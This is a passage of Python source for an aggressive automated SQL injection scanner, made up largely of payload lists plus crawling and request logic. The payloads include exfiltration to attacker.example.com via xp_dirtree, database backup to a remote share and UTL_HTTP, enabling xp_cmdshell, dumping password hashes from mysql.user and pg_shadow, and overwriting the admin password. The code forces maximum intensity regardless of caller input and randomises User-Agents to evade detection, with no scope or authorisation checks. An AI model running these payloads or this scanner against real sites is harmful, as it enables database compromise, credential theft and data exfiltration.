            "1'; EXEC master..xp_cmdshell 'ping -n 3 127.0.0.1'--",
            "1'; DECLARE @q varchar(8000); SELECT @q=0x73656c65637420404076657273696f6e--",
            "1'; EXEC('sp_password')--",
            "'; DECLARE @q NVARCHAR(200); SET @q = N'sel' + N'ect 1'; EXEC(@q); --",
            # Additional MSSQL payloads
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --",
            "'; EXEC master..xp_dirtree '\\\\attacker.example.com\\share'; --",
            "'; use master; exec xp_cmdshell 'whoami'; --",
            "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Services\\MSSQLSERVER','ImagePath'; --",
            "'; BACKUP DATABASE master TO DISK = '\\\\attacker.example.com\\share\\backup.bak'; --",
            "'; IF OBJECT_ID('tempdb..#t') IS NOT NULL DROP TABLE #t; CREATE TABLE #t (c varchar(8000)); INSERT INTO #t VALUES ('SQLi'); --",
            "'; SELECT CAST('SQLi' AS varchar(8000)); --"
        ]
        
        # PostgreSQL specific
        self.postgres_payloads = [
            "1' AND 1=(SELECT pg_sleep(3))--",
            "1' AND 1=(SELECT COUNT(*) FROM generate_series(1,10000000))--",
            "1' AND 1=(SELECT 1 FROM pg_sleep(3))--",
            "1'; SELECT pg_sleep(3)--",
            "1'; SELECT current_database()--",
            "1' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)--",
            # Additional PostgreSQL payloads
            "1' AND (SELECT 1 FROM PG_SLEEP(3))=1--",
            "1' AND 1=(SELECT count(*) FROM generate_series(1,1000000))--",
            "1' AND (SELECT current_setting('is_superuser'))='on'--",
            "1' AND (SELECT usename FROM pg_user WHERE usesuper=true LIMIT 1)='postgres'--",
            "1' AND EXISTS(SELECT 1 FROM pg_type WHERE typname='vulnerable')--",
            "1' AND (SELECT 'postgresql' || CASE WHEN (SELECT usename FROM pg_user WHERE usename='postgres') THEN pg_sleep(3) ELSE '' END)=''--",
            "1' AND CASE WHEN (SELECT current_database())='postgres' THEN pg_sleep(3) ELSE '' END=''--"
        ]
        
        # Oracle specific
        self.oracle_payloads = [
            "1' AND 1=(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",
            "1' AND 1=utl_inaddr.get_host_address('google.com')--",
            "1' AND 1=dbms_pipe.receive_message('RDS',3)--",
            "1' UNION SELECT SYS.DATABASE_NAME FROM v$database--",
            "1' AND 1=(SELECT 1 FROM dual)--",
            # Additional Oracle payloads
            "1' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.example.com')=''--",
            "1' AND DBMS_PIPE.RECEIVE_MESSAGE('pipe',5)=''--",
            "1' AND 1=(SELECT 1 FROM (SELECT SYS_CONTEXT ('USERENV','SESSION_USER') FROM DUAL) WHERE ROWNUM=1)--",
            "1' AND SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual--",
            "1' AND (SELECT UTL_HTTP.REQUEST('http://attacker.example.com/') FROM DUAL)=''--",
            "1' AND SYS.DBMS_ASSERT.ENQUOTE_LITERAL('SQLi')='SQLi'--",
            "1' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)=''--"
        ]
        
        # User enumeration payloads
        self.user_enum_payloads = [
            # MySQL
            "' UNION SELECT user(),2,3 --",
            "' UNION SELECT current_user(),2,3 --",
            "' UNION SELECT system_user(),2,3 --",
            "' UNION SELECT user,password,3 FROM mysql.user --",
            
            # PostgreSQL
            "' UNION SELECT current_user,session_user,3 --",
            "' UNION SELECT usename,passwd,3 FROM pg_shadow --",
            
            # MSSQL
            "' UNION SELECT SYSTEM_USER,USER_NAME(),3 --",
            "' UNION SELECT user_name(),2,3 --",
            "' UNION SELECT loginame,name,3 FROM master..syslogins --",
            
            # Oracle
            "' UNION SELECT username,password,3 FROM all_users --",
            "' UNION SELECT SYS.LOGIN_USER,SYS.DATABASE_NAME,3 FROM DUAL --",
            
            # SQLite
            "' UNION SELECT sqlite_version(),2,3 --"
        ]
        
        # Database schema enumeration payloads
        self.schema_enum_payloads = [
            # MySQL
            "' UNION SELECT table_name,table_schema,3 FROM information_schema.tables --",
            "' UNION SELECT column_name,table_name,3 FROM information_schema.columns --",
            "' UNION SELECT CONCAT(table_schema,'.',table_name),2,3 FROM information_schema.tables --",
            
            # PostgreSQL
            "' UNION SELECT table_name,table_catalog,3 FROM information_schema.tables --",
            "' UNION SELECT column_name,table_name,3 FROM information_schema.columns --",
            
            # MSSQL
            "' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U' --",
            "' UNION SELECT name,object_id,3 FROM sys.tables --",
            "' UNION SELECT name,2,3 FROM syscolumns --",
            
            # Oracle
            "' UNION SELECT table_name,owner,3 FROM all_tables --",
            "' UNION SELECT column_name,table_name,3 FROM all_tab_columns --",
            
            # SQLite
            "' UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table' --",
            "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table' --"
        ]
        
        # Out-of-band exfiltration payloads (DNS/HTTP)
        self.oob_payloads = [
            # These would require a callback server in a real attack
            "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.example.com\\\\share\\\\file')) --",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.example.com\\\\share\\\\file')),2,3 --",
            "'; exec master..xp_dirtree '\\\\attacker.example.com\\share\\'; --"
        ]
        
        # WAF Bypass payloads - keeping original
        self.waf_bypass_payloads = [
            # Unicode/alternate encodings
            "1%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/1,2,3--",
            "%u0027 OR %u0031=%u0031--%u0027",
            "/**/and/**/1=1",
            "/*!50000and*/1=1",
            
            # Case manipulation
            "' oR '1'='1",
            "UniON sEleCt 1,2,3--",
            
            # Space alternatives
            "'/**/OR/**/1=1--",
            "'+OR+1=1--",
            "'\t OR \t1=1--",
            
            # Comment sequences
            "/*!*/and/*!*/1=1",
            "/**/1'or'1'='1",
            
            # Double encoding
            "%2527%2520OR%25201%253D1--",
            
            # Hex encoding
            "0x31 OR 0x31=0x31--"
        ]
        
        # Advanced Blind payloads - similar to before but making sure complete
        self.advanced_blind_payloads = [
            # Boolean-based
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND 'abc'='abc'--",
            "1' AND 'abc'='def'--",
            "1' AND length(database())>1--",
            "1' AND ascii(substring(database(),1,1))>90--",
            
            # Time-based with different delays
            "1' AND (SELECT * FROM (SELECT(SLEEP(1)))A)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(2)))A)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(3)))A)--",
            
            # Second-order injection (store and trigger)
            "x'; INSERT INTO log_table(message) VALUES('injected'); --",
            "x'; UPDATE users SET password='hacked' WHERE username='admin'; --"
        ]
    
    async def scan_url(self, url: str, max_depth: int = None, intensity: str = "max") -> List[Dict[str, Any]]:
        """
        Scan a URL for SQL injection vulnerabilities with adaptive scanning.
        
        Args:
            url: The URL to scan
            max_depth: Maximum crawl depth (overrides constructor value if provided)
            intensity: Scan intensity (low, medium, high, max)
                       Note: Scanner always uses maximum capabilities regardless of what is passed
            
        Returns:
            List of vulnerabilities found
        """
        logger.info(f"Starting enhanced SQL injection scan for: {url}")
        print(f"Starting enhanced SQL injection scan for: {url}")
        
        # Always use maximum intensity for best results
        intensity = "max"
        
        vulnerabilities = []
        
        try:
            # Initialize performance tracking and timing
            self.performance_stats = {
                "requests_total": 0,
                "requests_successful": 0,
                "requests_failed": 0,
                "avg_response_time": 0.0,
                "error_rate": 0.0,
                "start_time": time.time(),
                "last_adjustment_time": time.time(),
                "current_concurrency": self.max_concurrent_requests,
                "min_concurrency": max(2, self.max_concurrent_requests // 5),
                "max_concurrency": self.max_concurrent_requests * 2,
            }
            self.scan_start_time = time.time()
            
            # Normalize URL
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            # Override max depth if provided
            if max_depth is not None:
                self.max_crawl_depth = max_depth
            
            # Create a semaphore for limiting concurrent requests
            # This will be dynamically adjusted during scanning
            semaphore = asyncio.Semaphore(self.performance_stats["current_concurrency"])
            
            # Configure crawler with aggressive settings for maximum coverage
            self.crawler = IntelligentCrawler.for_intensity(intensity)
            
            # For maximum effectiveness, override crawler settings with even more aggressive values
            if intensity == "max":
                # Allow much more aggressive crawling to find as many potential vulnerable URLs as possible
                self.crawler.max_crawl_depth = 15  # Deep crawling
                self.crawler.max_crawl_urls = 1000  # Allow more URLs to be discovered
                self.crawler.max_concurrent_requests = max(30, self.max_concurrent_requests)  # More concurrent crawling
                # Configure rate limiter for crawler to be more aggressive but still respectful
                self.crawler.rate_limiter = RateLimiter(rate_limit=30.0, burst_limit=50)
            
            logger.info(f"Configured crawler with aggressive settings: depth={self.crawler.max_crawl_depth}, max_urls={self.crawler.max_crawl_urls}, concurrency={self.crawler.max_concurrent_requests}")
            
            # Start the feedback loop task
            feedback_loop_task = asyncio.create_task(self._feedback_loop())
            
            # Step 1: Use the shared intelligent crawler to discover URLs
            print(f"Starting crawl process - this may take some time depending on site complexity...")
            discovered_urls = await self.crawler.crawl(url)
            
            # Add the base URL to the discovered URLs if not already present
            discovered_urls.add(url)
            
            # If very few URLs were discovered, try crawling with altered settings
            if len(discovered_urls) < 5:
                print(f"Few URLs discovered. Attempting alternate crawling approach...")
                # Try a different approach for heavily JavaScript-based sites
                original_crawler = self.crawler
                self.crawler = IntelligentCrawler(max_crawl_depth=3, max_crawl_urls=200, max_concurrent_requests=10)
                self.crawler.headers["X-Requested-With"] = "XMLHttpRequest"  # Help identify AJAX requests
                alt_discovered_urls = await self.crawler.crawl(url)
                # Merge results
                discovered_urls.update(alt_discovered_urls)
                # Restore original crawler
                self.crawler = original_crawler
            
            # Track the total discovered URLs for reporting
            total_discovered = len(discovered_urls)
            
            logger.info(f"Discovered {total_discovered} URLs to test")
            print(f"Discovered {total_discovered} URLs to test")
            
            # Step 2: Prioritize URLs based on likelihood of vulnerability
            prioritized_urls = self._prioritize_urls(discovered_urls)
            
            # Log the breakdown of prioritization
            if prioritized_urls:
                high_risk_count = sum(1 for u in prioritized_urls if any(param in u.lower() for param in ['id=', 'user=', 'search=', 'query=']))
                medium_risk_count = sum(1 for u in prioritized_urls if '=' in u and not any(param in u.lower() for param in ['id=', 'user=', 'search=', 'query=']))
                low_risk_count = len(prioritized_urls) - high_risk_count - medium_risk_count
                print(f"URL priority breakdown: {high_risk_count} high-risk, {medium_risk_count} medium-risk, {low_risk_count} low-risk")
            
            # Step 3: Process URLs in chunks with adaptive scanning
            chunk_size = int(self.chunk_size)  # Ensure chunk_size is an integer
            total_chunks = (len(prioritized_urls) + chunk_size - 1) // chunk_size
            
            # Create a tracking structure for scan statistics
            scan_stats = {
                "total_urls": len(prioritized_urls),
                "processed_urls": 0,
                "skipped_urls": 0,
                "urls_with_params": 0,
                "start_time": time.time()
            }
            
            for chunk_index in range(total_chunks):
                # Check if scan timeout reached
                if time.time() - self.scan_start_time > self.scan_timeout:
                    logger.warning(f"Scan timeout reached after processing {chunk_index} chunks")
                    break
                
                # Get the current chunk of URLs
                start_idx = chunk_index * chunk_size
                end_idx = min(start_idx + chunk_size, len(prioritized_urls))
                current_chunk = prioritized_urls[start_idx:end_idx]
                
                logger.info(f"Processing chunk {chunk_index+1}/{total_chunks} ({len(current_chunk)} URLs)")
                print(f"Processing chunk {chunk_index+1}/{total_chunks} ({len(current_chunk)} URLs), " +
                      f"found {len(vulnerabilities)} vulnerabilities so far...")
                
                # Get the current concurrency setting (which may have been adjusted)
                current_concurrency = self.performance_stats["current_concurrency"]
                if current_concurrency != semaphore._value:
                    # Recreate semaphore with new concurrency value
                    semaphore = asyncio.Semaphore(current_concurrency)
                    logger.info(f"Adjusted concurrency to {current_concurrency}")
                
                # Create tasks for scanning all URLs in the current chunk
                tasks = []
                for target_url in current_chunk:
                    # Skip URLs we shouldn't scan, but count them
                    if not self._should_scan_url(target_url):
                        scan_stats["skipped_urls"] += 1
                        continue
                        
                    # Count URLs with parameters (likely to be vulnerable)
                    if '?' in target_url and '=' in target_url:
                        scan_stats["urls_with_params"] += 1
                        
                    # Create task for directly processing this URL with our check methods
                    task = asyncio.create_task(self._process_url(target_url, semaphore))
                    tasks.append(task)
                
                # Wait for all tasks in the chunk to complete
                chunk_results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Process results, filtering out exceptions
                for result in chunk_results:
                    if isinstance(result, list) and not isinstance(result, Exception):
                        vulnerabilities.extend(result)
                
                # Update scan statistics
                scan_stats["processed_urls"] += len(tasks)
                        
                # Update progress
                self.scan_progress = min(99, int(((chunk_index + 1) / total_chunks) * 100))
                
                # Adjust chunk size based on performance
                if self.performance_stats["error_rate"] < 0.1 and self.performance_stats["avg_response_time"] < 1.0:
                    # Increase chunk size if things are going well
                    chunk_size = min(int(chunk_size * 1.5), 50)
                elif self.performance_stats["error_rate"] > 0.3 or self.performance_stats["avg_response_time"] > 3.0:
                    # Decrease chunk size if encountering problems
                    chunk_size = max(10, int(chunk_size / 1.5))
            
            # Cancel the feedback loop task
            feedback_loop_task.cancel()
            try:
                await feedback_loop_task
            except asyncio.CancelledError:
                pass
            
            # Mark progress as complete
            self.scan_progress = 100
            
            # Print scan statistics
            scan_duration = time.time() - scan_stats["start_time"]
            print(f"Scanner processed {scan_stats['processed_urls']} URLs " +
                  f"({scan_stats['urls_with_params']} with parameters) in {scan_duration:.2f} seconds")
            if scan_stats['skipped_urls'] > 0:
                print(f"Note: {scan_stats['skipped_urls']} URLs were skipped (static files, etc.)")
            
        except Exception as e:
            logger.error(f"Error during SQL injection scan: {str(e)}")
            traceback.print_exc()  # Print full traceback for debugging
            
            # Add an error vulnerability
            error_id = str(uuid.uuid4())
            vulnerabilities.append({
                "id": error_id,
                "name": "Scanner Error",
                "description": f"An error occurred during the SQL injection scan: {str(e)}",
                "severity": "info",
                "url": url,
                "evidence": str(e),
                "remediation": "Check if the URL is accessible and try again"
            })
        
        # Log scan completion
        scan_duration = time.time() - self.scan_start_time
        logger.info(f"SQL injection scan completed in {scan_duration:.2f} seconds. Found {len(vulnerabilities)} vulnerabilities.")
        print(f"SQL injection scan completed in {scan_duration:.2f} seconds. Found {len(vulnerabilities)} vulnerabilities.")
        
        # Ensure all vulnerabilities have consistent format
        for vuln in vulnerabilities:
            # Make sure each vulnerability has an ID
            if 'id' not in vuln:
                vuln['id'] = str(uuid.uuid4())
                
            # Make sure each vulnerability has a URL field
            if 'url' not in vuln and 'location' in vuln:
                vuln['url'] = vuln.pop('location')
            elif 'url' not in vuln:
                vuln['url'] = url
                
            # Make sure there's a severity field with a valid value
            if 'severity' not in vuln:
                vuln['severity'] = 'medium'
            
            # Make sure severity is lowercase
            if isinstance(vuln['severity'], str):
                vuln['severity'] = vuln['severity'].lower()
            
            # Ensure there's a name and description
            if 'name' not in vuln:
                vuln['name'] = 'SQL Injection Vulnerability'
            if 'description' not in vuln:
                vuln['description'] = 'A SQL injection vulnerability was detected'
                
        return vulnerabilities
    
    def _prioritize_urls(self, urls: Set[str]) -> List[str]:
        """
        Prioritize URLs based on their likelihood of containing SQL injection vulnerabilities.
        
        Args:
            urls: Set of URLs to prioritize
            
        Returns:
            List of URLs sorted by priority (highest first)
        """
        high_priority = []
        medium_priority = []
        low_priority = []
        
        # High-value parameter names that are frequently vulnerable in real-world applications
        high_risk_params = [
            'id', 'user_id', 'item_id', 'product_id', 'post_id', 'article_id', 'page_id', 'news_id', 'category_id',
            'cat_id', 'action_id', 'material_id', 'section_id', 'module_id', 'record_id', 'profile_id', 
            'file_id', 'ticket_id', 'message_id', 'thread_id', 'topic_id', 'group_id', 'event_id', 
            'type', 'uid', 'pid', 'tid', 'gid', 'sid', 'lid', 'cid'
        ]
        
        # Parameters often used in search/filter functionality (frequently vulnerable)
        search_params = [
            'search', 'query', 'q', 'filter', 'keyword', 'find', 'lookup', 'term', 'terms', 'key',
            'where', 'criteria', 'condition', 'search_for', 'searchterm', 'search_query',
            'pattern', 'contains', 'name', 'title'
        ]
        
        # Parameters commonly found in authentication systems (frequently vulnerable)
        auth_params = [
            'username', 'user', 'email', 'login', 'account', 'pass', 'pin', 'auth', 'memberid',
            'customer', 'member', 'admin'
        ]
        
        # Generate regex patterns for efficiency
        id_pattern = re.compile(r'[?&](' + '|'.join(high_risk_params) + r')=\d+', re.IGNORECASE)
        search_pattern = re.compile(r'[?&](' + '|'.join(search_params) + r')=', re.IGNORECASE)
        auth_pattern = re.compile(r'[?&](' + '|'.join(auth_params) + r')=', re.IGNORECASE)
        
        # Vulnerable file extensions and endpoints commonly seen in real-world applications
        vulnerable_extensions = ['.php', '.asp', '.aspx', '.jsp', '.do', '.action', '.cgi']
        vulnerable_endpoints = ['admin', 'login', 'user', 'account', 'profile', 'product', 
                               'item', 'search', 'api', 'query', 'report', 'view', 'show',
                               'display', 'backend', 'dashboard', 'control', 'panel', 'manage',
                               'list', 'catalog', 'category', 'cart', 'order', 'shop', 'store']
        
        for url in urls:
            parsed = urlparse(url)
            path_lower = parsed.path.lower()
            
            # High priority: URLs with numeric ID parameters (most common SQL injection points)
            if id_pattern.search(url):
                high_priority.append(url)
            # High priority: URLs with search/query/filter parameters
            elif search_pattern.search(url):
                high_priority.append(url)
            # High priority: URLs with authentication parameters
            elif auth_pattern.search(url):
                high_priority.append(url)
            # High priority: URLs with multiple parameters (complex queries are often vulnerable)
            elif url.count('=') > 2:
                high_priority.append(url)
            # High priority: URLs with specific vulnerable file extensions
            elif any(path_lower.endswith(ext) for ext in vulnerable_extensions) and '=' in url:
                high_priority.append(url)
            # Medium priority: URLs with any parameters
            elif '=' in url:
                medium_priority.append(url)
            # Medium priority: Common endpoints that might involve database operations
            elif any(endpoint in path_lower for endpoint in vulnerable_endpoints):
                medium_priority.append(url)
            # Medium priority: Paths containing numbers (often resource identifiers)
            elif re.search(r'/\d+(?:/|$)', path_lower):
                medium_priority.append(url)
            # Low priority: All other URLs
            else:
                low_priority.append(url)
        
        # Random shuffle within each priority group to avoid hitting the same patterns
        random.shuffle(high_priority)
        random.shuffle(medium_priority)
        random.shuffle(low_priority)
        
        # Combine all priority groups
        return high_priority + medium_priority + low_priority
        
    async def _feedback_loop(self):
        """
        Continuously monitor and adjust scanning parameters based on performance.
        """
        try:
            while True:
                await asyncio.sleep(self.concurrency_adjustment_interval)
                
                # Skip adjustment if not enough time has passed
                current_time = time.time()
                if current_time - self.performance_stats["last_adjustment_time"] < self.concurrency_adjustment_interval:
                    continue
                
                # Adjust concurrency based on performance metrics
                await self._adjust_concurrency()
                
                # Record the adjustment time
                self.performance_stats["last_adjustment_time"] = current_time
                
        except asyncio.CancelledError:
            # Task was cancelled, clean up
            logger.debug("Feedback loop task cancelled")
        except Exception as e:
            logger.error(f"Error in feedback loop: {str(e)}")
    
    def _update_performance_stats(self, success: bool, response_time: float = 0.0):
        """
        Update performance statistics for feedback loop.
        
        Args:
            success: Whether the request was successful
            response_time: Request response time in seconds
        """
        self.performance_stats["requests_total"] += 1
        
        if success:
            self.performance_stats["requests_successful"] += 1
            
            # Update average response time with moving average
            if response_time > 0:
                if self.performance_stats["avg_response_time"] == 0:
                    self.performance_stats["avg_response_time"] = response_time
                else:
                    # Weighted moving average (more weight to recent times)
                    self.performance_stats["avg_response_time"] = (
                        0.8 * self.performance_stats["avg_response_time"] + 0.2 * response_time
                    )
        else:
            self.performance_stats["requests_failed"] += 1
    
    async def _adjust_concurrency(self):
        """
        Adjust concurrency based on server response and error rates.
        Reduces concurrency when encountering problems, increases when things are going well.
        """
        async with self.concurrency_lock:
            # Only adjust concurrency if enough time has passed since last adjustment
            current_time = time.time()
            if current_time - self.performance_stats["last_adjustment_time"] < self.concurrency_adjustment_interval:
                return
                
            # Update the last adjustment time
            self.performance_stats["last_adjustment_time"] = current_time
            
            # Calculate current error rate and average response time
            requests_total = self.performance_stats["requests_total"]
            if requests_total == 0:
                return  # Not enough data to make adjustments
                
            error_rate = self.performance_stats["requests_failed"] / requests_total
            avg_response_time = self.performance_stats["avg_response_time"]
            
            # Get current concurrency setting
            current_concurrency = self.performance_stats["current_concurrency"]
            
            # Define thresholds for adjustment
            high_error_threshold = 0.2  # 20% errors
            moderate_error_threshold = 0.1  # 10% errors
            high_latency_threshold = 3.0  # 3 seconds
            moderate_latency_threshold = 2.0  # 2 seconds
            
            # Decide based on error rate and response time
            if error_rate > high_error_threshold or avg_response_time > high_latency_threshold:
                # Significant problems - reduce concurrency by 50%
                new_concurrency = max(
                    self.performance_stats["min_concurrency"],
                    int(current_concurrency * 0.5)
                )
                logger.info(f"Reducing concurrency significantly: {current_concurrency} -> {new_concurrency} " +
                           f"(error rate: {error_rate:.2f}, avg response time: {avg_response_time:.2f}s)")
                
            elif error_rate > moderate_error_threshold or avg_response_time > moderate_latency_threshold:
                # Moderate problems - reduce concurrency by 25%
                new_concurrency = max(
                    self.performance_stats["min_concurrency"],
                    int(current_concurrency * 0.75)
                )
                logger.info(f"Reducing concurrency moderately: {current_concurrency} -> {new_concurrency} " +
                           f"(error rate: {error_rate:.2f}, avg response time: {avg_response_time:.2f}s)")
                
            elif error_rate < 0.05 and avg_response_time < 1.0:
                # Things are going well - increase concurrency by up to 20%
                # Use progressive increases based on current performance
                increase_factor = min(1.2, 1.0 + (0.2 * (1.0 - error_rate) * (1.0 / max(0.5, avg_response_time))))
                new_concurrency = min(
                    self.performance_stats["max_concurrency"],
                    int(current_concurrency * increase_factor)
                )
                
                # Only log if we're actually changing
                if new_concurrency > current_concurrency:
                    logger.info(f"Increasing concurrency: {current_concurrency} -> {new_concurrency} " +
                               f"(error rate: {error_rate:.2f}, avg response time: {avg_response_time:.2f}s)")
            else:
                # Current concurrency seems appropriate, maintain it
                return
                
            # Apply the new concurrency setting
            self.performance_stats["current_concurrency"] = new_concurrency
            
            # Also adjust rate limiter settings based on the same metrics
            domains_to_adjust = set()
            for domain, stats in self.rate_limiter.domain_throttling.items():
                domains_to_adjust.add(domain)
                
            # Adjust rate limits for active domains
            for domain in domains_to_adjust:
                domain_error_rate = self.rate_limiter.performance_data[domain].get("error_rate", 0)
                domain_response_time = self.rate_limiter.performance_data[domain].get("avg_response_time", 1.0)
                
                # Increase rate limit for well-behaving domains
                if domain_error_rate < 0.05 and domain_response_time < 1.0:
                    current_limit = self.rate_limiter.domain_limits[domain]
                    new_limit = min(self.rate_limiter.max_rate_limit, current_limit * 1.2)
                    if new_limit > current_limit:
                        self.rate_limiter.domain_limits[domain] = new_limit
                        logger.debug(f"Increasing rate limit for {domain}: {current_limit:.2f} -> {new_limit:.2f} req/s")
                
                # Decrease rate limit for problematic domains
                elif domain_error_rate > 0.2 or domain_response_time > 3.0:
                    current_limit = self.rate_limiter.domain_limits[domain]
                    new_limit = max(self.rate_limiter.min_rate_limit, current_limit * 0.7)
                    if new_limit < current_limit:
                        self.rate_limiter.domain_limits[domain] = new_limit
                        logger.debug(f"Decreasing rate limit for {domain}: {current_limit:.2f} -> {new_limit:.2f} req/s")
    
    def _get_random_headers(self) -> Dict[str, str]:
        """
        Get randomized headers for HTTP requests.
        
        Returns:
            Dict[str, str]: Dictionary of HTTP headers
        """
        # Base headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # Randomize User-Agent to avoid detection
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
        ]
        
        headers['User-Agent'] = random.choice(user_agents)
        
        # Add cache control headers
        if random.random() < 0.5:
            headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        
        return headers
    
    async def _apply_rate_limiting(self, hostname: str) -> None:
        """
        Apply rate limiting for a specific domain.
        
        Args:
            hostname: The hostname to apply rate limiting for
        """
        # Ensure domain_throttling is initialized
        if not hasattr(self, 'domain_throttling'):
            self.domain_throttling = defaultdict(int)
            
        # Use the rate limiter to apply domain-specific rate limiting
        await self.rate_limiter.wait_for_token(hostname)
        
        # Track throttling
        self.domain_throttling[hostname] += 1
        
    def _select_payloads(self, url: str, param_name: str, param_value: str) -> List[str]:
        """
        Select appropriate SQL injection payloads based on context and previous results.
        
        Args:
            url: Target URL
            param_name: Parameter name
            param_value: Parameter value
            
        Returns:
            List of payloads to try
        """
        # Start with basic set of payloads
        payloads = self.error_payloads[:10]  # First use a smaller set of common payloads
        
        # Add database-specific payloads based on URL patterns or previous detections
        if "php" in url.lower() or "mysql" in url.lower():
            # Likely MySQL
            payloads.extend(self.mysql_payloads[:3])
        elif "asp" in url.lower() or "mssql" in url.lower():
            # Likely MSSQL
            payloads.extend(self.mssql_payloads[:3])
        elif "jsp" in url.lower() or "oracle" in url.lower():
            # Likely Oracle
            payloads.extend(self.oracle_payloads[:2] if hasattr(self, 'oracle_payloads') else [])
        elif "postgresql" in url.lower() or "pgsql" in url.lower():
            # Likely PostgreSQL
            payloads.extend(self.postgres_payloads[:3])
            
        # If parameter looks like an ID, add specific payloads
        if param_name.lower() in ['id', 'uid', 'user_id', 'item_id', 'product_id']:
            id_payloads = [
                f"1 OR 1=1",
                f"1) OR (1=1",
                f"-1 UNION SELECT 1,2,3--",
                f"' OR '1'='1' ORDER BY 1--"
            ]
            payloads.extend(id_payloads)
            
        # If parameter looks like authentication-related, add auth bypass payloads
        if param_name.lower() in ['username', 'user', 'email', 'login', 'password', 'pass']:
            auth_payloads = [
                f"admin'--",
                f"admin' OR '1'='1",
                f"admin')--",
                f"admin') OR ('1'='1",
                f"' OR 1=1 LIMIT 1;--"
            ]
            payloads.extend(auth_payloads)
            
        # Add WAF bypass payloads if we're testing a site that might have a WAF
        if len(payloads) > 15:
            # If we have a lot of payloads, we're probably working with a complex target
            # Add some WAF bypass techniques
            payloads.extend(self.waf_bypass_payloads[:3] if hasattr(self, 'waf_bypass_payloads') else [])
            
        # Shuffle payloads to avoid predictable patterns
        random.shuffle(payloads)
        
        # Limit total number of payloads to avoid excessive testing
        max_payloads = 20
        return payloads[:max_payloads]

    def _should_scan_url(self, url: str) -> bool:
        """
        Determine if a URL should be scanned for SQL injection.
        
        Args:
            url: The URL to check
            
        Returns:
            bool: True if the URL should be scanned, False otherwise
        """
        # Skip empty URLs
        if not url:
            return False
        
        # Skip invalid URLs
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                return False
                
            # Skip non-HTTP URLs
            if not parsed.scheme.startswith('http'):
                return False
        except Exception:
            return False
        
        # Skip common static file extensions
        static_extensions = [
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.ico', '.svg',  # Images
            '.css', '.js', '.json', '.xml',  # Web assets
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',  # Documents
            '.zip', '.rar', '.tar', '.gz', '.7z',  # Archives
            '.mp3', '.mp4', '.avi', '.mov', '.mkv', '.flv',  # Media
            '.ttf', '.woff', '.woff2', '.eot',  # Fonts
        ]
        
        path = parsed.path.lower()
        if any(path.endswith(ext) for ext in static_extensions):
            return False
        
        # Skip URLs that have already been fingerprinted to avoid duplicates
        url_fingerprint = generate_url_fingerprint(url)
        if url_fingerprint in self.url_fingerprints:
            return False
            
        # Skip URLs with special parameters we don't want to test
        query_params = parse_qs(parsed.query)
        if any(param.lower() in ['csrf', 'nonce', 'token'] for param in query_params):
            # These are security tokens that shouldn't be tampered with
            # Still process the URL, but will skip these parameters when testing
            pass
            
        # Add the URL fingerprint to the set so we don't scan it again
        self.url_fingerprints.add(url_fingerprint)
            
        return True

    async def _check_url_parameters(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check URL parameters for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore for limiting concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        parsed_url = urlparse(url)
        
        # Skip URLs without query parameters
        if not parsed_url.query:
            return vulnerabilities
        
        # Parse query parameters
        query_params = parse_qs(parsed_url.query)
        
        # Skip URLs with too many parameters to avoid excessive testing
        if len(query_params) > 20:
            logger.warning(f"Skipping URL with too many parameters: {url}")
